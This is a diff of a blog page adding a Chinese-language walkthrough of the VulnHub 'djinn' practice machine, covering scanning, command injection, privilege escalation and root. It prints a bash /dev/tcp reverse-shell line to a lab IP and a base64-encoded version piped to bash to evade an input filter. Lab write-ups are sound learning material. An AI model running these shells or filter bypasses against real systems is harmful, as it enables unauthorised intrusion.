@@ -86,8 +86,12 @@
         <p>   这次要做的是vulnhub上的一个靶机<a href="https://www.vulnhub.com/entry/djinn-1,397/" target="_blank" rel="noopener">djiin</a>,可以点击链接自行下载。</p>
 <hr>
 <h6 id="主机发现"><a href="#主机发现" class="headerlink" title="#####  主机发现"></a>#####  主机发现</h6><p>​       在导入靶机时，虽然靶机上主动显示了靶机的ip，但是为了正规一点，还是对靶机进行扫描，一般来说做主机发现，可以使用netdiscover,详细使用方法可以 - h 查看更多。但是这里使用namp 做一个简单的主机发现。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">nmap 192.168.xxx.0&#x2F;24</span></pre></td></tr></table></figure>
+
 <p><img src="/images/djinn/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0.png" alt="nmap 192.168.xxx.0/24"></p>
 <h5 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h5><p>​      获得靶机的ip后，接下来探测靶机的ip，可以发现，靶机开放了21,1337,7331端口，接下来就是端口利用了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">namp -sV -p- 192.168.xxx.xxx</span></pre></td></tr></table></figure>
+
 <p> <img src="/images/djinn/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.png" alt="nmap -sV -p- 192.168.xxx.xxx"></p>
 <p>​                                                        #####      端口利用</p>
 <p>​                                                      ######  21端口利用</p>
@@ -102,25 +106,53 @@
 <p>​       一开始访问这个页面，本菜以为是作者放出来的迷雾弹，没怎么上心。使用dirb的默认字典，没有得出结果后便去看别的端口，最后还是老老实实回来了。这次使用gobuster进行扫描，字典使用大字典。</p>
 <p><img src="/images/djinn/7331%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95.png" alt="gouster扫描结果"></p>
 <p> 这次扫描出来两个目录，进行访问，这里重点放在wish目录，可以发现wish有个命令执行，进行简单的测试，使用whoami,ls，进行测试</p>
+<p><img src="/images/djinn/%E8%AE%BF%E9%97%AE%E7%9B%AE%E5%BD%95.png" alt="访问wish"></p>
 <p><img src="/images/djinn/whoami%E6%B5%8B%E8%AF%95.png" alt=""></p>
 <p>可以发现，返回结果为www-data，不多说，上shell</p>
 <p><img src="/images/djinn/python%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5.png" alt="python shell"></p>
 <p>但是发现请求被拒绝，那么可以猜到，作者应该对输入进行了拦截，那么使用base64进行编码，然后再解码执行呢？</p>
 <p><img src="/images/djinn/catbase64%E6%88%90%E5%8A%9F.png" alt="解码"></p>
 <p>这里使用cat app.py，可以发现我们的命令被执行了！那么再使用shell连接呢</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.224.161&#x2F;5678 0&gt;&amp;1</span></pre></td></tr></table></figure>
+
 <p><img src="/images/djinn/shell%E5%B1%9E%E6%80%A7.png" alt="shell 编码"></p>
 <p><img src="/images/djinn/%E5%8F%8D%E5%BC%B9shell.png" alt="反弹shell"></p>
 <p><img src="/images/djinn/%E6%8B%BF%E5%88%B0shell.png" alt=""></p>
 <p>在上面要注意到的一点是，反弹shell的语句：</p>
 <p>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNC4xNjEvNTY3OCAwPiYx | base64 -d | bash</p>
-<p>这条语句应该在浏览器内中执行，burpsuite的重放模块不一定能反弹到。</p>
+<p>这条语句应该在浏览器内中执行，burpsuite的重放模块不一定能反弹到,并且重放模块也未相应的进行url编码。</p>
 <p>​                   </p>
-<p>​                                                                     #####  提权</p>
+<pre><code>#####  提权</code></pre><p>当我们拿到shell时，我们发现自己为www-data用户，因此，我们需要想办法提升自己的权限。因此，在查找以后，在app.py中发现了一个文件。</p>
+<p><img src="/images/djinn/%E5%8F%91%E7%8E%B0%E7%9B%B2%E7%82%B9.png" alt="突破"></p>
+<p>经过访问，我们发现这是一个叫做nitish用户，以及其密码。</p>
+<p><img src="/images/djinn/su%E4%B8%BAnitish%E7%94%A8%E6%88%B7.png" alt=""></p>
+<p>此时，需要一个会话来进行用户切换，因此使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span></pre></td></tr></table></figure>
+
+<p>进行切换，此时我们查看自己能够执行的文件</p>
+<p><img src="/images/djinn/%E7%9C%8B%E5%88%B0usertxt%E5%B9%B6%E4%B8%94sudo.png" alt=""></p>
+<p>此时我们发现我们可以以sam用户的身份来执行genie命令，那么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">genie -h  发现我们可以执行的命令</span></pre></td></tr></table></figure>
+
+<p>但是，我们被无情嘲笑了…..这是逼我们的，使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">man genie</span></pre></td></tr></table></figure>
+
+<p>对genie进行分析，忽然我们可以看到一个cmd的命令</p>
+<p><img src="/images/djinn/man_genie%E6%88%90%E4%B8%BAsam.png" alt=""></p>
+<p>此时利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo  -u sam genie -cmd new      执行完可以发现我们是sam用户了～</span></pre></td></tr></table></figure>
+
+<p><img src="/images/djinn/%E6%88%90%E4%B8%BAsam.png" alt=""></p>
+<p>此时我们如法炮制，紧接着，我们发现可以以root用户身份执行/root/lago,执行以后，我们发现要玩一个猜随机数游戏…这种人品游戏怎么玩啊，溜溜。我们再度对这个游戏进行探测，发现该游戏为python编写而成。而python的老版本中存在类型判断问题，假设随机数为num来定义，并且判断逻辑为input=num，那么如果我们输入num，可能会成功。说试就试</p>
+<p><img src="/images/djinn/%E6%88%90%E4%B8%BAroot.png" alt=""></p>
+<p>接下来我们发现自己为root用户了～该干嘛就干嘛了</p>
+<p>​                                                                     #####   总结</p>
+<p>​         这个靶机是一个很有意思的靶机，而其中解决的思路来自于<a href="https://www.hackingarticles.in/djinn1-vulnhub-walkthrough/" target="_blank" rel="noopener"> RAJ CHANDEL</a>,因此很感谢这位作者，如果没有他的witeup，自己很难做出来这个靶机，对靶机已经writeup作者表示感谢。并且在此，也接触到man工具，有兴趣的同学也可以继续学习。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://qimingstar.github.io/2019/12/01/djinn/" data-id="ck3od79x50000lpjx8i51ahzf" class="article-share-link">Share</a>
+      <a data-url="https://qimingstar.github.io/2019/12/01/djinn/" data-id="ck3oeapis0000n3jxhhhnazyb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -157,7 +189,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://qimingstar.github.io/2019/12/01/hello-world/" data-id="ck3od79xi0001lpjxaefqbkxb" class="article-share-link">Share</a>
+      <a data-url="https://qimingstar.github.io/2019/12/01/hello-world/" data-id="ck3oeapj50001n3jx9y2r1flc" class="article-share-link">Share</a>
       
       
     </footer>
